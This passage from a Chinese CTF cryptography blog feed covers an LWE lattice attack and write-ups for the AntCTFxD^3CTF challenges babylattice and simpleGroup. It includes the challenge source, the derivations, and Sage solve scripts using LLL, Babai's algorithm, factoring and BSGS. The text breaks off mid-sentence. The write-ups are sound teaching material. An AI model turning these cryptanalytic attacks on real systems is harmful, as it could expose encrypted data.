b_i<br>$$<br>那么造出来的格子应该是下面这个矩阵<br>$$<br>(s_0,s_1,\cdots,s_{31},k_0,k_1,\cdots,k_{63})<br>\begin{pmatrix}<br>M_{0,0}&amp;M_{1,0}&amp;\cdots&amp;M_{63,0}\\<br>M_{0,1}&amp;M_{1,1}&amp;\cdots&amp;M_{63,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>M_{0,31}&amp;M_{1,31}&amp;\cdots&amp;M_{63,31}\\<br>q&amp;0&amp;\cdots&amp;0\\<br>0&amp;q&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;0&amp;q<br>\end{pmatrix}<br>=<br>(b_0,b_1,\cdots,b_{63})<br>$$</p><p>实际上做题的时候矩阵是上面$p$下面$M$的, 然后还有关于为什么要用64组LWE的问题, 根据某个大佬的博客, 组数越多越好, 所以基本上题目给了多少组就用上多少组</p><p>通过对构造出来的格子进行规约得到good basis然后用最近平面算出$(b_0,b_1,…,b_{63})$<br>再解方程$s \cdot M = b \ (mod \ p)$即可得到$s$</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line"></span><br><span class="line">q = <span class="number">8934325385505568130914092337950620590424921674062792756625169144539462888362199042365894202712873706261308891694743761726859424971637596576879385466842113</span></span><br><span class="line">L = [...]</span><br><span class="line">n = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">Q = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line">R = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line">LL = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        LL[i][j] = L[i][<span class="number">0</span>][j] </span><br><span class="line">M = Matrix(LL).transpose()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            Q[i][j] = q</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">    R[i] = L[i][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">R = vector(R)</span><br><span class="line">L = Matrix(Q).stack(Matrix(M))</span><br><span class="line">lattice = IntegerLattice(L, lll_reduce=<span class="literal">True</span>)</span><br><span class="line">closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)</span><br><span class="line"></span><br><span class="line">FLAG = Matrix(Zmod(q), M.transpose())</span><br><span class="line">flag = FLAG.solve_right(closest_vector)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join( <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;做Ant&amp;amp;d3的时候发现自己Lattice还不会, 所以就去学了一波Lattice, 顺便就了解了一下LWE, 发现这玩意居然有三次比赛用的都是同一个板子, 也每个都去做了分析了一下, 然后就集中在这里了.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;感谢一位大大大大大</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="LWE" scheme="http://tearsjin.github.io/tags/LWE/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021AntCTFxD^3CTF Crypto</title>
    <link href="http://tearsjin.github.io/2021/03/08/write-for-2021AntCTFxD-3CTF/"/>
    <id>http://tearsjin.github.io/2021/03/08/write-for-2021AntCTFxD-3CTF/</id>
    <published>2021-03-08T11:08:34.000Z</published>
    <updated>2021-03-14T12:11:37.662Z</updated>
    
    <content type="html"><![CDATA[<p>啊这次的这个比赛因为不会Lattice, 导致基本不会做啊, 虽然比赛后半段去学了也试着做了, 虽然格子造出来还被自己蠢到了, 但还是…收获很多hh</p><p>记录一下吧</p><h1 id="babylattice"><a href="#babylattice" class="headerlink" title="babylattice"></a>babylattice</h1><p>当时做题的时候完全没有看到明文就是一个数字, 并不能转换成有语义的字符串….导致格子都造出来了还一直卡着<br>但也体会到了一些造格子的方法, 以及格约出向量后需要注意的地方</p><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line">PublicKey = namedtuple(<span class="string">&#x27;PublicKey&#x27;</span>, [<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">SecretKey = namedtuple(<span class="string">&#x27;SecretKey&#x27;</span>, [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;A&#x27;</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    p = random_prime(<span class="number">2</span>^<span class="number">512</span>, lbound=<span class="number">2</span>^<span class="number">511</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span>^<span class="number">512</span>, lbound=<span class="number">2</span>^<span class="number">511</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    a11, a12, a21 = [random_prime(<span class="number">2</span>^<span class="number">100</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    a22 = random_prime(<span class="number">2</span>^<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> a11 * a22 == a12 * a21:</span><br><span class="line">        a22 = random_prime(<span class="number">2</span>^<span class="number">100</span>)</span><br><span class="line">    A = Matrix(ZZ, [[a11, a12], [a21, a22]])</span><br><span class="line">    a1 = crt([a11, a21], [p, q])</span><br><span class="line">    a2 = crt([a12, a22], [p, q])</span><br><span class="line">    b = a1 * inverse_mod(a2, n) % n</span><br><span class="line">    PK = PublicKey(n, b)</span><br><span class="line">    SK = SecretKey(p, q, A)</span><br><span class="line">    <span class="keyword">return</span> (PK, SK)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, pk</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt; m &lt; <span class="number">2</span>^<span class="number">400</span></span><br><span class="line">    r = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">400</span>-<span class="number">1</span>)</span><br><span class="line">    c = (pk.b*m + r) % pk.n</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c, sk</span>):</span></span><br><span class="line">    a2 = crt([sk.A[<span class="number">0</span>,<span class="number">1</span>], sk.A[<span class="number">1</span>,<span class="number">1</span>]], [sk.p, sk.q])</span><br><span class="line">    s1 = a2 * c % sk.p</span><br><span class="line">    s2 = a2 * c % sk.q</span><br><span class="line">    m, r = sk.A.solve_right(vector([s1, s2]))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">pk, sk, num=<span class="number">3</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        m = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">400</span>-<span class="number">1</span>)</span><br><span class="line">        c = encrypt(m, pk)</span><br><span class="line">        mm = decrypt(c, sk)</span><br><span class="line">        <span class="keyword">assert</span> m == mm</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">    <span class="keyword">from</span> secret <span class="keyword">import</span> m, FLAG</span><br><span class="line">    <span class="keyword">assert</span> FLAG == <span class="string">&#x27;d3ctf&#123;%s&#125;&#x27;</span> % sha256(<span class="built_in">int</span>(m).to_bytes(<span class="number">50</span>, <span class="string">&#x27;big&#x27;</span>)).hexdigest()</span><br><span class="line">    PK, SK = gen_key()</span><br><span class="line">    test(PK, SK)</span><br><span class="line">    c = encrypt(m, PK)</span><br><span class="line">    print(<span class="string">f&quot;PK = <span class="subst">&#123;PK&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">PK = PublicKey(n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361, b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196)</span></span><br><span class="line"><span class="string">c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="出现的参数"><a href="#出现的参数" class="headerlink" title="出现的参数"></a>出现的参数</h2><ul><li>$m$: 明文, $m \in (0,2^{400})$</li><li>$c = m \cdot b + r \ (mod\ n)$ : 密文, 其中$r \in (0,2^{400})$</li><li>$A = \begin{pmatrix} a_{11}&amp;a_{21}\\a_{12}&amp;a_{22}\end{pmatrix}$四个$a$都是100-Bit</li><li>$p,q$: 512-Bit prime</li><li>$a1 = crt([a11, a21], [p, q])\ a2 = crt([a12, a22], [p, q])$</li><li>$b = a_1 \cdot a_2^{-1} mod \ n$</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>由$c = m \cdot b + r (mod \ n)$可以得到$c = m \cdot b + r + \mu n$</p><p>移项有$c - m \cdot b - \mu n = r$</p><p>考虑到$m,r$都是未知的, 而且都是400位以下, 尝试构造格子将$m,r$规约出来</p><p>这里的式子左边有三个项, 所以构造一个3维的格子</p><p>因为是三维的格子, 所以最短向量的大小大概是$det(\mathcal L)^{1/3}$</p><p>而$m,r \leq 2^{400}$, 所以需要将格子的$Det$放大一点<br>$$<br>\begin{pmatrix}<br>2^{200}&amp;0&amp;c\\<br>0&amp;1&amp;-b\\<br>0&amp;0&amp;-n<br>\end{pmatrix}<br>$$<br>那么会有<br>$$<br>(1 ,m,\mu)<br>\begin{pmatrix}<br>2^{200}&amp;0&amp;c\\<br>0&amp;1&amp;-b\\<br>0&amp;0&amp;-n<br>\end{pmatrix}<br>=<br>(2^{200},m,r)<br>$$<br>即,存在一个格点$(2^{200},m,r)$, 用LLL规约即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">b = <span class="number">65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196</span></span><br><span class="line">c = <span class="number">64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">2</span>^<span class="number">200</span>, <span class="number">0</span>,c])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, <span class="number">1</span>,-b])</span><br><span class="line">v3 = vector(ZZ, [<span class="number">0</span>, <span class="number">0</span>,-n])</span><br><span class="line">Lattice = matrix([v1,v2,v3])</span><br><span class="line">m = <span class="built_in">abs</span>(Lattice.LLL()[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">print( <span class="string">&#x27;d3ctf&#123;%s&#125;&#x27;</span> % sha256(m).hexdigest())</span><br></pre></td></tr></table></figure><p>注意到实际格约出来的向量是全负的, 因为$(-2^{200},-m,-r)$也在格子里面, 所以记得加个<code>abs()</code></p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这次的题第一题如果不是做的预期解那么第二题就会特别的难, 所以也顺便学习了一下预期解的做法(<del>出题人预期了非预期解</del></p><p>如果不从$c = b \cdot m + r (mod \ n)$入手的话, 就先看看前面几个参数的关系<br>$$<br>\begin{array}{}<br>a_1 \equiv a_{11} \ (mod \ p)\\<br>a_1 \equiv a_{21} \ (mod \ q)\\<br>\end{array}\quad<br>\begin{array}{}<br>a_2 \equiv a_{12} \ (mod \ p)\\<br>a_2 \equiv a_{22} \ (mod \ q)\\<br>\end{array}\quad<br>b \equiv a_1 \cdot a_2^{-1} \ (mod \ n)<br>$$<br>上面这三个式子, 可以得到这么一个方程组<br>$$<br>\begin{array}{}<br>a_{12} \cdot b = a_{11} + k_1p \\<br>a_{22} \cdot b = a_{21} + k_2q<br>\end{array}<br>$$<br>做到这里的时候, 有想过把方程组的两个式子相乘, 得到的会是<br>$$<br>a_{12}a_{22}b^2 = a_{11}a_{21} + k_2a_{11}q + k_1a_{21}p + k_1k_2pq<br>$$<br>但是这里已知的量只有$b,pq$, 也就是说在这个式子里, 有三项一个已知的都没有, 这样是没办法造格子的, 到这里就卡住了, 不得不翻看wp, 才发现, 原来可以把$a_{11}, a_{21}$移到左边再相乘, 这样就只有一个项是未知的了!<br>$$<br>\begin{array}{}<br>a_{12} \cdot b - a_{11} = k_1p \\<br>a_{22} \cdot b - a_{21} = k_2q<br>\end{array}<br>\Rightarrow<br>a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) + a_{11}a_{21} = k_1k_2pq<br>$$<br>记$K = k_1k_2,n = pq$再移一下项<br>$$<br>a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) - Kn = -a_{11}a_{21}<br>$$<br>然后就是喜闻乐见的造格子<br>$$<br>(a_{12}a_{22}, -(a_{12}a_{21}+a_{11}a_{22}), -K)<br>\begin{pmatrix}<br>1&amp;0&amp;b^2\\<br>0&amp;-1&amp;b\\<br>0&amp;0&amp;n<br>\end{pmatrix}<br>=<br>(a_{12}a_{22}, a_{12}a_{21}+a_{11}a_{22}, -a_{11}a_{21})<br>$$<br>可以看到右侧的向量长度很短, 可以规约出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1173142580751247504024100371706709782500216511824162516724129,1382843159437215516163973075066558157591473749635266665605630,-211380743487233628797755584958526337321408979158793229985661)</span><br></pre></td></tr></table></figure><p>因为四个$a$都是100位的素数, 直接用<a href="http://www.factordb.com分解/">http://www.factordb.com分解</a><br>$$<br>1018979931854255696816714991181\\<br>1151291153120610849180830073509\\<br>207806651167586080788016046729\\<br>1017199123798810531137951821909<br>$$<br>因为$gcd(a_{12} \cdot b - a_{11} , n) = p$, 猜一下上面四个数哪两个是$a_{12},a_{11}$就可以得到$p$了, 得到$p$就可以分解$n$, 直接得到所有的参数, 跑解密算法就可以得到明文了</p><h1 id="simpleGroup"><a href="#simpleGroup" class="headerlink" title="simpleGroup"></a>simpleGroup</h1><p>这题比赛的时候也没做出来(第一题都做不出怎么做这题), 比完赛做了第一题才做这题<br>啊啊啊但是因为太久没做次幂的运算导致做了好久…….</p><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># A gift for key recovery in challenge [babyLattice]</span></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line"></span><br><span class="line">M = <span class="built_in">int</span>.from_bytes(FLAG, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">while</span> M != <span class="number">0</span>:</span><br><span class="line">    m = M % e</span><br><span class="line">    M //= e</span><br><span class="line">    r = randint(<span class="number">0</span>, n-<span class="number">1</span>)</span><br><span class="line">    c = power_mod(y, m, n) * power_mod(r, e, n)</span><br><span class="line">    C.append(c % n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;C = <span class="subst">&#123;C&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>$n$ 用的还是第一题的, 所以第一题分解出来的$p,q$这题就有用了</p><p>加密的式子大概是$c_i = y^{m_i} \cdot r^{e} \ (mod \ n)$ ,$c,y,e$都是已知的, 而且$m_i &lt; e$</p><p>因为$r$是不知道的, 肯定要想办法消去$r$ , (有的师傅不消去$r$也可以做, 待会下面补充一下)</p><p>这里的$e$比较特殊, $gcd(e, (p-1)(q-1)) =e $</p><p>这意味着我们可以直接计算一个$d = {phi \over e}$, 使得$r^{ed} = r^{phi} = 1 (mod \ n)$, 欧拉定理yyds</p><p>加密的式子两边来个$d$次幂, 就会有<br>$$<br>c_i^d = y^{md} \ (mod \ n)<br>$$<br>做到这里想把$d$消去再用bsgs求离散对数, 但因为$d  \ mod \ phi$没有逆元卡了好久, 真的蠢…</p><p>这里$y$是已知的, 直接看成$c_i^d = (y^{d})^m \ (mod \ n)$, 用bsgs就完事了(用bsgs是因为m的范围是已知的)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">n=<span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span></span><br><span class="line">y = <span class="number">12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328</span></span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">C = [...]</span><br><span class="line"></span><br><span class="line">a11 = <span class="number">207806651167586080788016046729</span></span><br><span class="line">a12 = <span class="number">1151291153120610849180830073509</span></span><br><span class="line">p = gcd(b * a12 - a11,n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">M = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gcd(e,phi) == e</span><br><span class="line">d = phi // e</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(randint(<span class="number">0</span>,n-<span class="number">1</span>),e,n),d,n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bounds = ( <span class="number">1</span>,e )</span><br><span class="line">F = IntegerModRing(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> C:</span><br><span class="line">    cd = <span class="built_in">pow</span>(i,d,n)</span><br><span class="line">    yd = <span class="built_in">pow</span>(y,d,n)</span><br><span class="line">    M.append(bsgs(F(yd),F(cd),bounds))</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> M[::-<span class="number">1</span>]:</span><br><span class="line">    flag = <span class="built_in">int</span>(flag) * <span class="built_in">int</span>(e) + <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="不用消去-r-的解"><a href="#不用消去-r-的解" class="headerlink" title="不用消去$r$的解"></a>不用消去$r$的解</h2><p><a href="https://www.anquanke.com/post/id/233827#h2-4">https://www.anquanke.com/post/id/233827#h2-4</a>, 这位师傅做的</p><p>一样先看一下加密的式子$c = y^{m} \cdot r^{e} \ (mod \ 